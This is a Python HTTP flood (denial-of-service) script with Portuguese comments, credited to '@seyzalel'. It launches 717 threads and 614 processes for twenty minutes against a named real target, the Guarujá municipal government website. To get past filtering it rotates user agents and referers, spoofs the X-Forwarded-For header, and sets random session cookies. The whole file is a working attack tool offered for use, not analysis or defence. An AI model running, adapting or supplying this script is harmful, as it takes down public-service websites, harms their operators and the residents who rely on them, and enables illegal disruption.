# Seeam, Inc Stresse. Todos os direitos reservados \ All created per @seyzalel

import requests
import threading
import multiprocessing
import random
import time
import string

# Lista de user agents e referers (Created per @seyzalel)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4825.62 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.15 Safari/537.36"
]

referers = [
    "http://www.google.com",
    "http://www.bing.com",
    "http://www.yahoo.com",
    "http://www.duckduckgo.com",
    "http://www.ask.com",
    "http://www.aol.com",
    "http://www.wikipedia.org",
    "http://www.reddit.com",
    "http://www.amazon.com",
    "http://www.facebook.com",
    "http://www.twitter.com",
    "http://www.youtube.com"
]

# Função para gerar um IP spoofed aleatório (Created per @seyzalel)
def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Função de geração de cookie aleatório (Created per @seyzalel)
def generate_random_cookie(length=20):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# Função de ataque com IP spoofed randomizado (Created per @seyzalel)
def flood(target_url, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            user_agent = random.choice(user_agents)
            referer = random.choice(referers)
            headers = {
                "User-Agent": user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache",
                "Connection": "keep-alive",
                "Referer": referer,
                "Pragma": "no-cache",
                "Upgrade-Insecure-Requests": "1"
            }
            # Adiciona cabeçalhos extras de ofuscação (Created per @seyzalel)
            headers["X-Requested-With"] = "XMLHttpRequest"
            headers["Origin"] = "http://example.com"
            headers["DNT"] = "1"
            headers["X-Forwarded-For"] = generate_random_ip()

            # Autenticação de cookies (Created per @seyzalel)
            cookies = {
                "sessionid": generate_random_cookie()
            }

            # Simulação de comportamento de usuário (Created per @seyzalel)
            session = requests.Session()
            session.headers = headers
            session.cookies.update(cookies)

            # Acessa páginas adicionais no site alvo (Created per @seyzalel)
            page = random.choice(["page1", "page2", "page3", "page4", "page5", "page6", "page7"])
            url = f"{target_url}/{page}"
            response = session.get(url)
            print(f"Request sent to {url}, Response code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

# Configurações do ataque (Created per @seyzalel)
target_url = "https://www.guaruja.sp.gov.br/"
duration = 1200
num_threads = 717
num_processes = 614

threads = []
processes = []
for _ in range(num_threads):
    thread = threading.Thread(target=flood, args=(target_url, duration))
    threads.append(thread)
    thread.start()

for _ in range(num_processes):
    process = multiprocessing.Process(target=flood, args=(target_url, duration))
    processes.append(process)
    process.start()

for thread in threads:
    thread.join()

for process in processes:
    process.join()